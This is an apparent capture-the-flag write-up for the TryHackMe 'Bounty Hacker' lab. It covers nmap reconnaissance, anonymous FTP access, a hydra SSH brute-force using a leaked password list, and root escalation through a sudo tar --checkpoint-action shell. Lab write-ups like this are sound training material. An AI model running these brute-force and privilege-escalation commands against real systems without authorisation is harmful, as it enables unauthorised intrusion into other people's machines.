# Bounty Hacker
Try Hack Me room
ip=10.10.152.23

# Reconnaissance 
### Nmap 
```bash
nmap -T5 -sV -A  $host_ip 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-01 04:56 EST
Nmap scan report for 10.10.152.23
Host is up (0.17s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.54.133
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)

```
Saved ip to /etc/host so i dont need to remenber ip 

Saved as => Bounty_hacker.thm

Going to that port we found a web hosted 

### Port 80

Looked into robots.txt nothing found so moved to fuzz it using ffuf
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://bounty_hacker.thm/FUZZ  -r 
```
Didn't find anything intersting. Since the box was easy i went to try the other ports 

### FTP 
Saw that Anonymous login was enabled on port 21. Intersting maybe there is something there. Found 2 files on the FTP server.
Lets GET them and see what happens.


## Lock.txt
This text file has what looks like some kind of credential, but to what? Lets try them on SSH since thats another open port.  
Note: We also found another text file on the ftp with a note     
1.) Protect Vicious.    
2.) Plan for Red Eye pickup on the moon.    
	-lin


## Gaining Access 
Lets try to bruteforce with the credentials we have and the user lin since its mentioned. 
```bash
hydra -l lin -P locks.txt 10.10.152.23  ssh 

```
Hoorray We are in !
```bash
	lin@bountyhacker:~/Desktop$ ls
	user.txt
	lin@bountyhacker:~/Desktop$ cat user.txt 

```

## Privilege Escalation
```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin              
                                                                                                                                   
User lin may run the following commands on bountyhacker:                                                                           
    (root) /bin/tar 

```
We can see that lin can run tar binary with special privilege lets check if [gtfobins](https://gtfobins.github.io/) on how to privilege our way.

We can search the tar binary 

[https://gtfobins.github.io/](https://gtfobins.github.io/)
We can see that we can use sudo to gain better pprivilege  using 
```bash 
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
And we are in 
```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh                       
tar: Removing leading `/' from member names                                                                                        
# whoami                                                                                                                           
root         
```
DONE !!!